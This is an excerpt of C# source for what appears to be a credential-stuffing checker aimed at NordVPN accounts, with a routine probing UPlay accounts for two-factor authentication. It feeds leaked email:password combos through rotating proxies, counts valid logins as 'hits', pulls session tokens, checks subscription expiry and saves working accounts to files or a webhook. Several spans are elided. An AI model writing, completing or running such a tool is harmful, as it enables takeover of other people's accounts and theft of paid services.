...
namespace ZuttPal
{
	internal class nordvpn1kek
	{
		...
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!nordvpn1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (nordvpn1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								...
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = nordvpn1check.RandomProxies();
								...
								if (login.Contains("Invalid username") || login.Contains("Invalid password"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref nordvpn1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref nordvpn1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref nordvpn1check.Bad); Interlocked.Increment(ref stats.bad);
								...
								else if (login.Contains("user_id"))
								{
									Interlocked.Increment(ref nordvpn1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
									Interlocked.Increment(ref nordvpn1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
									Interlocked.Increment(ref nordvpn1check.Hits); Interlocked.Increment(ref stats.hits);
						            Save(Path + "\\NoCapHits.txt", acc);
									string str1 = Base64Encode("token:" + Regex.Match(login, "token\":\"(.*?)\"").Groups[1].Value);
									...
									if (str3 == "Expired")
									{
										...
										{
											Colorful.Console.WriteLine("[»] Valid " + acc, Color.Yellow);
										}
									}
									if (str3 != "Expired")
									{
										if (str3.Contains("-"))
										{
											...
											if (Program.config.hitstowebhook == "True") { stats.result(yes); }Save(Path + "\\Hits.txt", yes);
											if (Program.config.showgood == "True" && Program.config.ui == 2)
											{
								...
								else
								{
									...
									Interlocked.Increment(ref nordvpn1check.retry);
									break;
								}
							}
							catch (Exception)
							{
								...
								string acc1 = email + ":" + password;
								nordvpn1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref nordvpn1check.retry);
								break;
							}
						}
			...
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						...
						if (httpRequest.Get(nordvpn1kek.SFACheckUri).ToString() == "[]")
							return true;
						break;
					}
				}
				...
				{
					Interlocked.Increment(ref nordvpn1check.Errors);
				}
			}
			return false;
		}
		...
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					...
					{
						req.Proxy = nordvpn1check.RandomProxies();
